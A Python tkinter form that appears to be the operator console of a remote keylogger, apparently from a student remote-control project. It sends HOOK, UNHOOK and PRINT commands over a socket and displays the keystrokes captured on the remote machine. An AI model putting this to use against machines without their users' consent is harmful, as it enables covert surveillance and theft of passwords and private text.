import tkinter as tk
import socket
from Program import Program

class KeylogForm(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.initialize_components()

    def initialize_components(self):
        self.title("Keystroke")

        self.txtKQ = tk.Text(self, state="disabled")
        self.txtKQ.pack(padx=12, pady=80)

        self.button1 = tk.Button(self, text="HOOK", command=self.hook)
        self.button1.place(x=12, y=12, width=75, height=59)
        self.button2 = tk.Button(self, text="UNHOOK", command=self.unhook)
        self.button2.place(x=93, y=13, width=75, height=58)
        self.button4 = tk.Button(self, text="IN PHÍM", command=self.print_log)
        self.button4.place(x=174, y=12, width=75, height=59)
        self.butXoa = tk.Button(self, text="Clear", command=self.clear_log)
        self.butXoa.place(x=256, y=13, width=74, height=58)

        self.protocol("WM_DELETE_WINDOW", self.keylog_closing)

    def hook(self):
        s = "HOOK"
        Program.nw.write(s + '\n'); Program.nw.flush();

    def unhook(self):
        s = "UNHOOK"
        Program.nw.write(s + '\n'); Program.nw.flush();

    def print_log(self):
        s = "PRINT"
        Program.nw.write(s + '\n'); Program.nw.flush();

        data = Program.client.recv(5000).strip()

        self.txtKQ.configure(state="normal")
        self.txtKQ.insert(tk.END, data)
        self.txtKQ.configure(state="disabled")

    def clear_log(self):
        self.txtKQ.configure(state="normal")
        self.txtKQ.delete("1.0", tk.END)
        self.txtKQ.configure(state="disabled")

    def keylog_closing(self):
        s = "QUIT"
        Program.nw.write(s + '\n'); Program.nw.flush();
        self.destroy()

